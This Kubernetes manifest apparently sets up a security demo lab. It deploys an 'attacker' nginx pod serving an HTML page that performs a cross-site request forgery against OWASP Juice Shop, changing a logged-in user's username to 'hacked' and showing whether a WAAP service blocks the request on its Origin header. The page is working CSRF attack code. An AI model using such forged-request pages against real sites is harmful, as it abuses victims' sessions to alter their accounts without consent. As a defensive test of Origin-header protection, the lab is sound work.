apiVersion: v1
kind: Namespace
metadata:
  name:  attacker
---
apiVersion: v1
kind: Pod
metadata:
  name: attacker-nginx
  namespace: attacker
  labels:
    app.kubernetes.io/name: attacker
spec:
  containers:
  - name: attacker-nginx
    image: nginx:1.27.3
    resources:
      requests:
        memory: 128Mi
        cpu: 100m
      limits:
        memory: 512Mi
        cpu: 500m
    ports:
      - containerPort: 80
    volumeMounts:
      - mountPath: /usr/share/nginx/html
        name: webpage-volume
  volumes:
    - configMap:
        defaultMode: 0775
        name: index-page
      name: webpage-volume
---
apiVersion: v1
kind: Service
metadata:
  name: attacker-nginx
  namespace: attacker
spec:
  selector:
    app.kubernetes.io/name: attacker
  ports:
    - protocol: TCP
      port: 9090
      targetPort: 80
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: index-page
  namespace: attacker
data:
  index.html: |
    <!DOCTYPE html>
    <html>
    <head><title>CSRF Attack</title></head>
    
    <script language="JavaScript">
        function submitForm() {
            let attackForm = document.forms["hackingform"];
            let urlField = attackForm.elements["juiceshopUrl"]
            let url = urlField.value;
            if (url.includes("://")) {
                url = url.substring(url.indexOf("://") + 3);
            }
            if (url.includes("/")) {
                url = url.substring(0, url.indexOf("/"));
            }
            url = "https://" + url + "/profile";
            attackForm.action=url;
            attackForm.submit();
        }
    </script>
    
    <body style="background-color:#FF6464; font-family: Roboto, Helvetica Neue, sans-serif;">
    
    <h2>Juiceshop Username Hacking Form</h2>
    
    This HTML page, loaded from a different website than Juiceshop, will send a request to the Juiceshop. Because     
    the page was not received from the Juiceshop URL, the browser will send an invalid "Origin" header with the
    request; the CSRF protection is based on validating this header. The Juiceshop will still accept the request
    because it does not validate where the request is coming from.
    <p></p>
    The request attempts to change the "Username" in the profile page to "hacked". 
    <p></p>
    <b>NOTE: </b> This attack requires that you are currently logged in at the Juiceshop in this webbrowser.
    Your existing session (in another tab or window) will be abused to send this "evil" request to Juiceshop.    
    <p></p>
    <div>
      <h3>Hacking Form - direct Juiceshop</h3>
        <ul>
            <li>Copy the URL of the Juiceshop tab</li>
            <li>Paste the Juiceshop URL in the "URL" form field below</li>
            <li>Then click the "Hack Username" button</li>
        </ul>
      <p>
        After these steps, the username attribute in Juiceshop will have changed to the value below.
      <form id="hackingform" 
            action="empty" 
           method="POST">
          URL:<input id="juiceshopUrl" name="url" type="text" value="" /><br>
       Username:<input name="username" type="text" value="hacked" />
       <input type="button" value="Hack Username" onClick="submitForm()" />
      </form>
    </div>
    
    <b>NOTE: </b>After submitting the form, you will either see the Juiceshop page here, which indicates that the
    attack was successful; or you will see an error message "Invalid origin", indicating the request was blocked
    by the Core-WAAP service.

    </body></html>
